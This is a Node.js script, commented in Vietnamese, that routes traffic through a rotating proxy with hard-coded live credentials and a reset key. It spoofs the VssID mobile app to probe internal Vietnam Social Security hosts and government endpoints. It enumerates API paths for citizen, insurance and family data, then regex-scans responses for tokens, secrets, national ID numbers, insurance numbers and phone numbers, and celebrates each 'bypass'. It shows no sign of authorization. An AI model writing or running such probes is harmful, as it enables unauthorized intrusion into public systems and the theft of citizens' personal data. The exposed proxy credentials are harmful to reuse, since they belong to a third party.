const axios = require('axios');
const https = require('https');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');

// Thông tin proxy server
const PROXY_CONFIG = {
  host: 'ip.mproxy.vn',
  port: 12301,
  username: 'beba111',
  password: 'tDV5tkMchYUBMD',
  resetUrl: 'https://mproxy.vn/capi/41ew9h9jIC3rLK3BAuihhU22JF8STiL_sGwzdC5b4no/key/tDV5tkMchYUBMD/resetIp'
};

// Tạo proxy URL
const proxyUrl = `http://${PROXY_CONFIG.username}:${PROXY_CONFIG.password}@${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`;

console.log('🚀 BYPASS DEEPER - SỬ DỤNG PROXY SERVER');
console.log(`🔗 Proxy: ${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`);
console.log(`👤 User: ${PROXY_CONFIG.username}`);
console.log('=' * 60);

// Reset IP trước khi bắt đầu
async function resetProxyIP() {
  try {
    console.log('🔄 Đang reset IP proxy...');
    const response = await axios.get(PROXY_CONFIG.resetUrl, {
      timeout: 10000
    });
    console.log('✅ Reset IP thành công:', response.status);
    console.log('📊 Response:', response.data);
  } catch (error) {
    console.log('⚠️ Không reset được IP:', error.message);
  }
}

// Tạo axios instance với proxy
function createProxyClient(targetUrl) {
  const isHttps = targetUrl.startsWith('https://');
  const agent = isHttps 
    ? new HttpsProxyAgent(proxyUrl)
    : new HttpProxyAgent(proxyUrl);

  return axios.create({
    httpsAgent: isHttps ? agent : undefined,
    httpAgent: !isHttps ? agent : undefined,
    timeout: 15000,
    headers: {
      'User-Agent': 'VssID-Mobile-App/1.0 (Android 10; SM-G975F)',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
      'Connection': 'keep-alive',
      'Cache-Control': 'no-cache'
    }
  });
}

// Test các endpoint nội bộ với proxy
async function testInternalEndpoints() {
  console.log('\n🔍 TESTING INTERNAL ENDPOINTS VỚI PROXY');
  console.log('=' * 60);

  const endpoints = [
    {
      name: 'VSS App Backend - Root',
      url: 'http://vssapp.teca.vn:8088/',
      critical: true
    },
    {
      name: 'VSS App Backend - Avatar API',
      url: 'http://vssapp.teca.vn:8088/user/avata?id=50a012380e72b6337a72f51a7c9136a9',
      critical: true
    },
    {
      name: 'VSS Internal Service',
      url: 'http://222.252.27.89:1111/',
      critical: true
    },
    {
      name: 'VSS Bot Service',
      url: 'https://bot.vss.gov.vn/',
      critical: true
    },
    {
      name: 'VSS Bot Avatar API',
      url: 'https://bot.vss.gov.vn/user/avata?id=50a012380e72b6337a72f51a7c9136a9',
      critical: false
    }
  ];

  for (let endpoint of endpoints) {
    console.log(`\n🔍 Testing: ${endpoint.name}`);
    console.log(`📍 URL: ${endpoint.url}`);
    
    try {
      const client = createProxyClient(endpoint.url);
      const response = await client.get(endpoint.url);
      
      console.log('🎉 THÀNH CÔNG! Đã bypass được rào cản!');
      console.log(`📊 Status: ${response.status} ${response.statusText}`);
      console.log('📋 Response Headers:');
      Object.keys(response.headers).slice(0, 10).forEach(key => {
        console.log(`   ${key}: ${response.headers[key]}`);
      });
      
      let data = response.data;
      if (typeof data === 'string') {
        console.log(`📄 Content Type: ${response.headers['content-type']}`);
        console.log('📝 Response Preview (first 800 chars):');
        console.log(data.substring(0, 800) + (data.length > 800 ? '...' : ''));
        
        // Tìm kiếm thông tin nhạy cảm
        const sensitivePatterns = [
          /token["\s]*[:=]["\s]*[a-zA-Z0-9_-]{10,}/gi,
          /api[_-]?key["\s]*[:=]["\s]*[a-zA-Z0-9_-]{10,}/gi,
          /secret["\s]*[:=]["\s]*[a-zA-Z0-9_-]{10,}/gi,
          /bearer["\s]*[:=]?["\s]*[a-zA-Z0-9_-]{10,}/gi,
          /bhxh["\s]*[:=]?["\s]*\d{10,}/gi,
          /cccd["\s]*[:=]?["\s]*\d{9,12}/gi,
          /phone["\s]*[:=]?["\s]*[0-9]{9,11}/gi
        ];
        
        let foundSensitive = false;
        sensitivePatterns.forEach(pattern => {
          const matches = data.match(pattern);
          if (matches) {
            console.log('🔴 THÔNG TIN NHẠY CẢM:');
            matches.forEach(match => console.log(`   ${match}`));
            foundSensitive = true;
          }
        });
        
        if (!foundSensitive) {
          console.log('✅ Không phát hiện thông tin nhạy cảm rõ ràng');
        }
        
      } else {
        console.log('📊 JSON Response:');
        console.log(JSON.stringify(data, null, 2).substring(0, 1000));
      }
      
      if (endpoint.critical) {
        console.log('🚨 ENDPOINT CRITICAL ĐÃ ĐƯỢC TRUY CẬP THÀNH CÔNG!');
      }
      
    } catch (error) {
      console.log(`❌ Lỗi: ${error.message}`);
      if (error.response) {
        console.log(`📊 Status: ${error.response.status}`);
        console.log(`📄 Error Data: ${JSON.stringify(error.response.data).substring(0, 200)}`);
      } else {
        console.log(`🔍 Error Code: ${error.code}`);
      }
    }
    
    console.log('\n' + '─'.repeat(80));
  }
}

// Test các endpoint API phổ biến qua proxy
async function testCommonAPIs() {
  console.log('\n🔍 TESTING COMMON API ENDPOINTS');
  console.log('=' * 60);
  
  const baseUrls = [
    'http://vssapp.teca.vn:8088',
    'http://222.252.27.89:1111'
  ];
  
  const apiPaths = [
    '/api/v1/user',
    '/api/user/info',
    '/api/auth/login',
    '/api/bhxh/lookup',
    '/api/citizen/info',
    '/mobile/api/user',
    '/user/profile',
    '/auth/token',
    '/api/data/personal',
    '/api/family/info'
  ];
  
  for (let baseUrl of baseUrls) {
    console.log(`\n🏢 Testing base: ${baseUrl}`);
    const client = createProxyClient(baseUrl);
    
    for (let path of apiPaths) {
      const fullUrl = baseUrl + path;
      console.log(`   🔗 ${path}`);
      
      try {
        const response = await client.get(fullUrl);
        console.log(`      ✅ ${response.status} - ${response.data ? 'Có dữ liệu' : 'Không có dữ liệu'}`);
        
        if (response.data && typeof response.data === 'object') {
          console.log(`         📊 JSON Keys: ${Object.keys(response.data).slice(0, 5).join(', ')}`);
        }
        
      } catch (error) {
        const status = error.response?.status || 'TIMEOUT/ERROR';
        console.log(`      ❌ ${status}`);
      }
    }
  }
}

// Chạy tất cả tests
async function main() {
  try {
    await resetProxyIP();
    await new Promise(resolve => setTimeout(resolve, 2000)); // Đợi 2s
    
    await testInternalEndpoints();
    await testCommonAPIs();
    
    console.log('\n🎯 HOÀN THÀNH BYPASS TESTING VỚI PROXY!');
    console.log('📊 Kết quả chi tiết đã được ghi lại ở trên.');
    
  } catch (error) {
    console.error('💥 Lỗi trong quá trình testing:', error.message);
  }
}

main();